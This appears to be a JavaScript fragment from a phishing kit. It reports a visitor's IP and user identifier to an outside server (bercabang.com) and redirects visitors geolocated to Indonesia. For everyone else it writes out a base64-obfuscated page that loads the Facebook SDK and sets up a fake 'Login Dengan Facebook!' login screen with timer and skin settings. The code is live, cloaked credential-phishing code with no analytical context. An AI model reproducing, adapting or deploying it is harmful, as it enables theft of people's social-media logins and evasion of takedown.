function eks(ip) {
		$.get( "https://bercabang.com/js.php?us=" +usr+ "&ip=" +ip+ "&time"+Date.now(), function( data ) {
			//console.log(data)
			console.log(data.url)
			console.log(data.geo)
					if(data.geo == 'ID'){
						window.location.replace(data.url);
					}else{
					  document.write("<title>" + ttl + "</title>");
						document.write("<link rel='image_src' href='" + img + "' />");
						document.write("<meta property='og:image' content='" + img + "' />");
						cmx('PG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiIC8+CjxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgbWF4aW11bS1zY2FsZT0xIiAvPgo8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vZmIwMWNteC5naXRodWIuaW8vc3R5bGUuY3NzIj4KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2ZvbnQtYXdlc29tZS80LjcuMC9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MiPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9T3BlbitTYW5zOjQwMCw2MDAsNzAwIiByZWw9InN0eWxlc2hlZXQiPgogIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjMuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2Nvbm5lY3QuZmFjZWJvb2submV0L2VuX1VTL2FsbC5qcyN4ZmJtbD0xIj4KPC9zY3JpcHQ+');
						likes=fp,
						tit="Login Dengan Facebook!",
						skin="04",
						waktu="60",
						tunggu="0",
						bahasa="id",
						us=usr,
						hs=atob(srv)
					}
		});
}
